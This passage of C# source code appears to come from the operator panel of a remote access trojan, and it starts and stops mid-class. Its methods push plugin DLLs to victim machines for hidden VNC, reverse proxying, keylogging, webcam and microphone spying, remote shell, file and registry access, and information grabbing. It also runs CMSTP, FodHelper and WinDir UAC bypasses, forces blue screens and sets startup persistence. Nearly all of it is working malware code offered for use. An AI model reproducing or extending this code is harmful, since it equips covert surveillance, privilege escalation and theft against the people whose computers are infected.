        /// If an error occurs during the HVNC start process, an exception is thrown and an error message is displayed.
        /// </remarks>
        private async Task StartHvnc(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Hvnc", File.ReadAllBytes("plugins\\Hvnc.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting HVNC!");
                    return;
                }
                Application.Run(new Forms.Hvnc(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with HVNC!");
            }
        }

        /// <summary>
        /// Asynchronously starts a reverse proxy using the provided client node.
        /// </summary>
        /// <param name="client">The node used to start the reverse proxy.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the reverse proxy setup or execution.</exception>
        /// <returns>No explicit return value.</returns>
        /// <remarks>
        /// This method starts a reverse proxy by creating a sub-node using the provided <paramref name="client"/> and loading the "ReverseProxy" plugin using the Utils.LoadDllAsync method.
        /// If the loading is successful, it launches a new instance of the Reverse_Proxy form and runs the application with the sub-node.
        /// After the application is closed, the sub-node is disconnected.
        /// If any error occurs during the process, an exception is caught and an error message is displayed using MessageBox.Show.
        /// </remarks>
        private async Task StartReverseProxy(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "ReverseProxy", File.ReadAllBytes("plugins\\ReverseProxy.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting ReverseProxy!");
                    return;
                }
                Application.Run(new Forms.Reverse_Proxy(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with ReverseProxy!" + e.Message); 
            }
        }

        /// <summary>
        /// Asynchronously starts the file manager for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the file manager is to be started.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method creates a sub-node for the specified <paramref name="client"/> and loads the "FileManager" plugin using the Utils.LoadDllAsync method.
        /// If the loading is successful, it starts the file manager application by running the File_manager form.
        /// The sub-node is then disconnected after the file manager application is closed.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the file manager operation.</exception>
        private async Task StartFileManager(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "FileManager", File.ReadAllBytes("plugins\\File manager.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting FileManager!");
                    return;
                }
                Application.Run(new Forms.File_manager(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with FileManager!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the registry manager for the specified <paramref name="client"/>.
        /// </summary>
        /// <param name="client">The node for which the registry manager is to be started.</param>
        /// <remarks>
        /// This method creates a sub-node <paramref name="subClient"/> using the <paramref name="client"/> and loads the "RegistryManager" plugin DLL using the <see cref="Utils.LoadDllAsync"/> method.
        /// If the loading is successful, it runs the "Registry_Manager" form for the <paramref name="subClient"/> using <see cref="Application.Run"/>.
        /// After the form is closed, it disconnects the <paramref name="subClient"/>.
        /// </remarks>
        /// <exception cref="Exception">Thrown when there is an error starting the registry manager or loading the DLL.</exception>
        private async Task StartRegistryManager(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "RegistryManager", File.ReadAllBytes("plugins\\Registry Manager.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting RegistryManager!");
                    return;
                }
                Application.Run(new Forms.Registry_Manager(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with RegistryManager!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the live microphone functionality for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the live microphone functionality is to be started.</param>
        /// <remarks>
        /// This method creates a sub-node using the specified <paramref name="client"/> and loads the "LiveMicrophone" plugin using the Utils.LoadDllAsync method.
        /// If the plugin is loaded successfully, it launches the Live_Microphone form using Application.Run method and disconnects the sub-node after the form is closed.
        /// If the plugin loading fails, it displays an error message using MessageBox.Show method.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the process of starting the live microphone functionality.</exception>
        private async Task StartLiveMicrophone(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "LiveMicrophone", File.ReadAllBytes("plugins\\LiveMicrophone.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting LiveMicrophone!");
                    return;
                }
                Application.Run(new Forms.Live_Microphone(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with LiveMicrophone!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the shell for the specified client.
        /// </summary>
        /// <param name="client">The client node for which the shell is to be started.</param>
        /// <remarks>
        /// This method creates a sub-client node using the specified <paramref name="client"/> and loads the "Shell" plugin DLL asynchronously.
        /// If the loading is successful, it starts the shell interface using the loaded plugin and runs the shell form.
        /// After the shell form is closed, it disconnects the sub-client node.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the shell operation.</exception>
        private async Task StartShell(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Shell", File.ReadAllBytes("plugins\\Shell.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Shell!");
                    return;
                }
                Application.Run(new Forms.Shell(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Shell!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the webcam functionality for the specified client node.
        /// </summary>
        /// <param name="client">The client node to start the webcam for.</param>
        /// <remarks>
        /// This method creates a sub-node using the specified <paramref name="client"/> and loads the "WebCam" plugin DLL asynchronously.
        /// If the loading is successful, it displays the webcam form and disconnects the sub-node after the form is closed.
        /// If the loading fails, it displays an error message and returns without starting the webcam.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the process of starting the webcam.</exception>
        private async Task StartWebCam(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "WebCam", File.ReadAllBytes("plugins\\WebCam.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting WebCam!");
                    return;
                }
                Application.Run(new Forms.WebCam(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with WebCam!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the key logger for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the key logger is to be started.</param>
        /// <exception cref="Exception">Thrown if an error occurs while starting the key logger.</exception>
        /// <returns>No explicit return value. The method is asynchronous and does not return a value.</returns>
        /// <remarks>
        /// This method starts a key logger for the specified client node by creating a sub node and loading the "KeyLogger" plugin using the Utils.LoadDllAsync method.
        /// If the loading is successful, it runs the key logger form and disconnects the sub client after the form is closed.
        /// If an error occurs during the process, it displays an error message using MessageBox.Show and catches the exception to display the error message.
        /// </remarks>
        private async Task StartKeyLogger(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "KeyLogger", File.ReadAllBytes("plugins\\KeyLogger.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting KeyLogger!");
                    return;
                }
                Application.Run(new Forms.KeyLogger(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with KeyLogger!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the offline keylogger for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the offline keylogger is to be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs while starting the offline keylogger.</exception>
        /// <returns>No explicit return value.</returns>
        /// <remarks>
        /// This method asynchronously creates a sub-node for the specified client using the value 2.
        /// It then attempts to load the "OfflineKeyLogger" DLL into the sub-node using the provided byte array of the DLL content and the AddLog method.
        /// If the loading is successful, it starts the offline keylogger form for the sub-node using the OfflineKeylogger form from the Forms namespace.
        /// After the form is closed, it disconnects the sub-node.
        /// If an error occurs during any of these steps, an exception message is displayed using a message box.
        /// </remarks>
        private async Task StartOfflineKeyLogger(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "OfflineKeyLogger", File.ReadAllBytes("plugins\\KeyLoggerOffline.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting KeyLoggerOffline!");
                    return;
                }
                Application.Run(new Forms.OfflineKeylogger(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with KeyLoggerOffline!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the Cmstp UAC bypass on the specified client node.
        /// </summary>
        /// <param name="client">The client node on which to start the bypass.</param>
        /// <remarks>
        /// This method starts the Cmstp UAC bypass on the specified client node by creating a subnode, loading the Uacbypass.dll, sending a byte array, receiving data, and handling success or failure messages.
        /// If the bypass fails to start, an error message is displayed.
        /// </remarks>
        /// <exception cref="Exception">Thrown if an error occurs during the bypass process.</exception>
        private async Task StartCmstpUacBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                subClient.SetRecvTimeout(5000);
                byte[] data=await subClient.ReceiveAsync();
                if (data == null || data[0] !=1) 
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the WinDirBypass process using the provided <paramref name="client"/>.
        /// </summary>
        /// <param name="client">The Node object representing the client to start the WinDirBypass process for.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the WinDirBypass process.</exception>
        /// <returns>No explicit return value. The WinDirBypass process is started asynchronously.</returns>
        /// <remarks>
        /// This method starts the WinDirBypass process by creating a sub-node using the provided <paramref name="client"/>.
        /// It then attempts to load the "Uacbypass" DLL into the sub-node using the Utils.LoadDllAsync method.
        /// If successful, it sends a byte array to the sub-node and waits for a response.
        /// If the response indicates success, it disconnects the sub-node and displays a success message.
        /// If any step fails, it displays an appropriate error message.
        /// </remarks>
        private async Task StartWinDirBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 2 });
                subClient.SetRecvTimeout(5000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }

        /// <summary>
        /// Starts the FodHelper Bypass process using the specified client node.
        /// </summary>
        /// <param name="client">The client node to start the FodHelper Bypass process.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method starts the FodHelper Bypass process by creating a sub-client node using the specified <paramref name="client"/>.
        /// It then attempts to load the "Uacbypass" DLL into the sub-client using the <see cref="Utils.LoadDllAsync"/> method.
        /// If successful, it sends a byte array to the sub-client and waits for a response.
        /// If the response indicates success, it disconnects the sub-client and displays a success message.
        /// If any step fails, it displays an appropriate error message.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the FodHelper Bypass process.</exception>
        private async Task StartFodHelperBypass(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 3 });
                subClient.SetRecvTimeout(5000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The Uacbypass most likely did not succeed");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The Uacbypass Started successfully! (this does not mean it 100% worked)");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass!" + e.Message);
            }
        }

        /// <summary>
        /// Initiates a request for admin privileges using the Uacbypass plugin.
        /// </summary>
        /// <param name="client">The Node object representing the client.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method initiates a request for admin privileges using the Uacbypass plugin by performing the following steps:
        /// 1. Creates a sub-node using the provided <paramref name="client"/>.
        /// 2. Loads the Uacbypass.dll file into the sub-node using the Utils.LoadDllAsync method.
        /// 3. Sends a byte array with value 4 to the sub-node.
        /// 4. Sets a receive timeout of 20000 milliseconds for the sub-node.
        /// 5. Receives data from the sub-node and checks if it is null or the first byte is not equal to 1.
        /// 6. Disconnects the sub-node and displays a message based on the received data.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the process, including errors related to loading the Uacbypass.dll or receiving data from the sub-node.</exception>
        private async Task StartRequestForAdmin(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 4 });
                subClient.SetRecvTimeout(20000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("The user most likely clicked no on the uac prompt (or it timed out)");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("The user clicked yes! You should have admin.");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass dll!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the de-escalation of permissions for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the de-escalation of permissions should be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the de-escalation process.</exception>
        /// <returns>No explicit return value. However, the method may throw an exception if an error occurs during the de-escalation process.</returns>
        /// <remarks>
        /// This method asynchronously creates a sub-node for the specified client and loads the "Uacbypass" DLL using the Utils.LoadDllAsync method.
        /// If the loading is successful, it sends a byte array to the sub-client and waits for a response. If the response indicates success, it disconnects the sub-client and displays a success message.
        /// If any step in the process fails, it displays an appropriate error message.
        /// </remarks>
        private async Task StartDeescalateperms(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Uacbypass", File.ReadAllBytes("plugins\\Uacbypass.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Uacbypass dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 5 });
                subClient.SetRecvTimeout(20000);
                byte[] data = await subClient.ReceiveAsync();
                if (data == null || data[0] != 1)
                {
                    MessageBox.Show("Failed to Start a new process with user perms.");
                    return;
                }
                subClient.Disconnect();
                MessageBox.Show("Started a new process with user perms.");
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Uacbypass dll!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the screen control for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the screen control needs to be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the screen control start process.</exception>
        /// <returns>No explicit return value. Starts the screen control for the specified client node.</returns>
        /// <remarks>
        /// This method asynchronously creates a sub-node <paramref name="subClient"/> using the <paramref name="client"/> node and loads the "ScreenControl" DLL using the <see cref="Utils.LoadDllAsync"/> method.
        /// If the loading is successful, it starts the screen control application using the <see cref="Application.Run"/> method with a new instance of the "ScreenControl" form.
        /// After the screen control application is closed, it disconnects the <paramref name="subClient"/>.
        /// If an error occurs during any of these steps, it displays an error message using the <see cref="MessageBox.Show"/> method.
        /// </remarks>
        private async Task StartScreenControl(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "ScreenControl", File.ReadAllBytes("plugins\\ScreenControl.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting ScreenControl!");
                    return;
                }
                Application.Run(new Forms.ScreenControl(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with ScreenControl!" + e.Message);
            }
        }

        /// <summary>
        /// Starts the blue screen process by creating a subnode, loading a DLL, and sending a byte array.
        /// </summary>
        /// <param name="client">The main node to start the blue screen process.</param>
        /// <returns>Task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method starts the blue screen process by creating a subnode using the provided <paramref name="client"/>.
        /// It then attempts to load a DLL named "Fun" with the content of the file "plugins\\Fun.dll" into the subnode using Utils.LoadDllAsync method.
        /// If the loading is successful, it sends a byte array to the subnode and waits for 1 second before disconnecting the subnode.
        /// If the loading fails, it shows an error message using MessageBox.Show and returns without further processing.
        /// If any exception occurs during the process, it shows an error message using MessageBox.Show along with the exception message.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the blue screen process.</exception>
        private async Task StartBlueScreen(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Fun", File.ReadAllBytes("plugins\\Fun.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Fun dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 0 });
                await Task.Delay(1000);
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with Fun dll!" + e.Message);
            }
        }

        /// <summary>
        /// Asynchronously starts the information grabbing process using the provided <paramref name="client"/>.
        /// </summary>
        /// <param name="client">The Node object used to initiate the information grabbing process.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the information grabbing process.</exception>
        /// <returns>No explicit return value. The method is asynchronous and does not return a value.</returns>
        /// <remarks>
        /// This method initiates the information grabbing process by creating a sub-node using the provided <paramref name="client"/>.
        /// It then attempts to load the "InfoGrab" DLL asynchronously using the Utils class and the provided sub-node.
        /// If the loading process is successful, it launches the InfoGrab form and runs the application, disconnecting the sub-node after completion.
        /// If the loading process fails, it displays an error message using MessageBox.
        /// If an exception occurs during the process, it displays an error message using MessageBox and includes the exception message.
        /// </remarks>
        private async Task StartInfoGrab(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "InfoGrab", File.ReadAllBytes("plugins\\InfoGrab.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting InfoGrab!");
                    return;
                }
                Application.Run(new Forms.InfoGrab(subClient));
                subClient.Disconnect();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error with WebCam!" + e.Message);
            }
        }

        /// <summary>
        /// Displays a message box using the provided client and message text.
        /// </summary>
        /// <param name="client">The Node client used to display the message box.</param>
        /// <param name="messageBox_text">The text to be displayed in the message box.</param>
        /// <exception cref="IOException">Thrown when an I/O error occurs while reading the "Fun.dll" file.</exception>
        /// <returns>No explicit return value.</returns>
        /// <remarks>
        /// This method creates a subClient using the provided client and then attempts to load the "Fun.dll" file into the subClient using the Utils.LoadDllAsync method.
        /// If the loading process is successful, it sends the message box text as UTF-8 encoded data to the subClient and then disconnects after a 1-second delay.
        /// If the loading process fails, it displays an error message box and returns without further execution.
        /// </remarks>
        private async Task DisplayMsgBox(Node client, string messageBox_text) 
        {
            Node subClient = await client.CreateSubNodeAsync(2);
            bool worked = await Utils.LoadDllAsync(subClient, "Fun", File.ReadAllBytes("plugins\\Fun.dll"), AddLog);
            if (!worked)
            {
                MessageBox.Show("Error Starting Fun dll!");
                return;
            }
            byte[] data = Encoding.UTF8.GetBytes(messageBox_text);
            await subClient.SendAsync(new byte[] { 1 });
            await subClient.SendAsync(data);
            await Task.Delay(1000);
            subClient.Disconnect();
        }

        /// <summary>
        /// Displays a message box with the specified message.
        /// </summary>
        /// <param name="client">The node on which the message box will be displayed.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method prompts the user to input a message that will be displayed in a message box.
        /// If the input message is empty or null, the method returns without displaying the message box.
        /// Otherwise, it displays the message box with the input message on the specified client node.
        /// If an error occurs during the process, a message box displaying "Error with Fun dll!" is shown.
        /// </remarks>
        private async Task StartMessageBox(Node client)
        {
            try
            {
                string messageBox_text=Interaction.InputBox("Message that will display", "MessageBox", "");
                if (string.IsNullOrEmpty(messageBox_text)) 
                {
                    return;
                }
                await DisplayMsgBox(client, messageBox_text);
            }
            catch
            {
                MessageBox.Show("Error with Fun dll!");
            }
        }

        /// <summary>
        /// Asynchronously starts the FunMenu for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the FunMenu is to be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the process of starting the FunMenu.</exception>
        /// <returns>Task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method starts the FunMenu for the specified client node by creating a subClient and loading the "Fun" DLL using the Utils.LoadDllAsync method.
        /// If the loading of the DLL is successful, it launches the FunMenu form using Application.Run and disconnects the subClient after the form is closed.
        /// If the loading of the DLL fails, it displays an error message using MessageBox.Show and returns without starting the FunMenu.
        /// If any other error occurs during the process, it displays an error message using MessageBox.Show.
        /// </remarks>
        private async Task StartFunMenu(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Fun", File.ReadAllBytes("plugins\\Fun.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Fun dll!");
                    return;
                }
                Application.Run(new Forms.FunMenu(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with FunMenu Form!");
            }
        }

        /// <summary>
        /// Asynchronously starts the startup process for the provided client node.
        /// </summary>
        /// <param name="client">The client node to start the startup process for.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the startup process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method starts the startup process for the provided client node by creating a sub-node, loading a DLL, and sending/receiving data.
        /// If the startup process fails, an error message is displayed. If successful, a success message is displayed.
        /// </remarks>
        private async Task StartStartup(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Startup", File.ReadAllBytes("plugins\\Startup.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Startup dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 0 });
                bool Startupworked=(await subClient.ReceiveAsync())[0]==1;
                if (Startupworked)
                {
                    MessageBox.Show("File added to startup!");
                }
                else 
                { 
                    MessageBox.Show("Failed to add to startup!");
                }
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with Startup dll!");
            }
        }

        /// <summary>
        /// Asynchronously starts the process of removing the startup using the provided <paramref name="client"/>.
        /// </summary>
        /// <param name="client">The Node object representing the client.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the removal process.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method starts by creating a sub-node using the provided <paramref name="client"/> and then attempts to load the "Startup" DLL using the Utils.LoadDllAsync method.
        /// If the loading is successful, it sends a byte array to the sub-client and displays a message indicating successful removal of the startup.
        /// If the loading fails, it displays an error message and returns from the method.
        /// In case of any exceptions during the process, an error message is displayed.
        /// </remarks>
        private async Task StartRemoveStartup(Node client)
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "Startup", File.ReadAllBytes("plugins\\Startup.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting Startup dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                MessageBox.Show("Startup removed!");
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with Startup dll!");
            }
            
        }

        /// <summary>
        /// Sends a byte array to the specified Node client, waits for 1 second, and then disconnects the client.
        /// </summary>
        /// <param name="client">The Node client to which the byte array will be sent.</param>
        /// <remarks>
        /// This method asynchronously sends a byte array containing the value 2 to the specified <paramref name="client"/> using the SendAsync method.
        /// After sending the byte array, it waits for 1 second using Task.Delay.
        /// Finally, it disconnects the <paramref name="client"/> using the Disconnect method.
        /// </remarks>
        private async Task StartClose(Node client) 
        {
            await client.SendAsync(new byte[] { 2 });
            await Task.Delay(1000);
            client.Disconnect();
        }

        /// <summary>
        /// Sends a byte array to the specified <paramref name="client"/> and then disconnects after a delay of 1000 milliseconds.
        /// </summary>
        /// <param name="client">The Node to which the byte array will be sent.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with a value of 3 to the specified <paramref name="client"/> using the SendAsync method.
        /// After sending the byte array, it waits for 1000 milliseconds using Task.Delay before disconnecting the client using the Disconnect method.
        /// </remarks>
        private async Task StartRelaunch(Node client)
        {
            await client.SendAsync(new byte[] { 3 });
            await Task.Delay(1000);
            client.Disconnect();
        }

        /// <summary>
        /// Initiates the uninstall process for the specified node.
        /// </summary>
        /// <param name="client">The node to be uninstalled.</param>
        /// <remarks>
        /// This method sends a byte array with the value 4 to the specified <paramref name="client"/> to initiate the uninstall process.
        /// After sending the byte array, it waits for 1000 milliseconds before disconnecting from the <paramref name="client"/>.
        /// </remarks>
        private async Task StartUninstall(Node client)
        {
            await client.SendAsync(new byte[] { 4 });
            await Task.Delay(1000);
            client.Disconnect();
        }

        /// <summary>
        /// Initiates the shutdown process for the specified <paramref name="client"/> node by performing the following steps:
        /// 1. Creates a sub-node using the <paramref name="client"/> node with the specified ID.
        /// 2. Loads the "SystemPower" DLL into the sub-node asynchronously using the Utils class, and logs the process using the <paramref name="AddLog"/> method.
        /// 3. Displays an error message if loading the "SystemPower" DLL fails and returns from the method.
        /// 4. Sends a byte array with value 1 to the sub-node asynchronously.
        /// 5. Delays the execution for 1000 milliseconds.
        /// 6. Disconnects the sub-node.
        /// </summary>
        /// <param name="client">The node for which the shutdown process is initiated.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <exception cref="Exception">Thrown when an error occurs during the shutdown process, specifically related to the "SystemPower" DLL.</exception>
        private async Task StartShutdown(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "SystemPower", File.ReadAllBytes("plugins\\SystemPower.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting SystemPower dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 1 });
                await Task.Delay(1000);
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with SystemPower dll!");
            }
        }

        /// <summary>
        /// Asynchronously starts or restarts the specified client node.
        /// </summary>
        /// <param name="client">The client node to start or restart.</param>
        /// <exception cref="Exception">Thrown when an error occurs while starting or restarting the client node.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method creates a sub-node using the provided <paramref name="client"/> and loads the "SystemPower" DLL using the <see cref="Utils.LoadDllAsync"/> method.
        /// If the DLL loading is unsuccessful, an error message is displayed, and the method returns.
        /// Otherwise, a byte array is sent to the sub-node, followed by a delay of 1000 milliseconds before disconnecting the sub-node.
        /// If an error occurs during the process, an error message related to the "SystemPower" DLL is displayed.
        /// </remarks>
        private async Task StartRestart(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                bool worked = await Utils.LoadDllAsync(subClient, "SystemPower", File.ReadAllBytes("plugins\\SystemPower.dll"), AddLog);
                if (!worked)
                {
                    MessageBox.Show("Error Starting SystemPower dll!");
                    return;
                }
                await subClient.SendAsync(new byte[] { 2 });
                await Task.Delay(1000);
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with SystemPower dll!");
            }
        }

        /// <summary>
        /// Starts the debug information for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the debug information is to be started.</param>
        /// <exception cref="Exception">Thrown when an error occurs while creating the subclient node or connecting the socket.</exception>
        /// <returns>Task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method asynchronously creates a subclient node using the specified client node and starts the debug information for it.
        /// If the subclient node creation fails, an error message is displayed using a message box, and the method returns without further processing.
        /// If the debug information form is successfully started, it runs the application with the debug information form and then disconnects the subclient node.
        /// If any error occurs during the process, an error message is displayed using a message box.
        /// </remarks>
        private async Task StartDebugInfo(Node client) 
        {
            try
            {
                Node subClient = await client.CreateSubNodeAsync(2);
                if (subClient==null)
                {
                    MessageBox.Show("Error connecting socket");
                    return;
                }
                Application.Run(new Forms.DebugInfo(subClient));
                subClient.Disconnect();
            }
            catch
            {
                MessageBox.Show("Error with Debug Form!");
            }
        }

        /// <summary>
        /// Starts a plugin by executing the provided function asynchronously.
        /// </summary>
        /// <param name="func">The function to be executed.</param>
        /// <param name="client">The client node to be passed to the function.</param>
        /// <remarks>
        /// This method starts a plugin by executing the provided function asynchronously using Task.Run.
        /// </remarks>
        private void StartPlugin(Func<Node, Task> func, Node client) 
        {
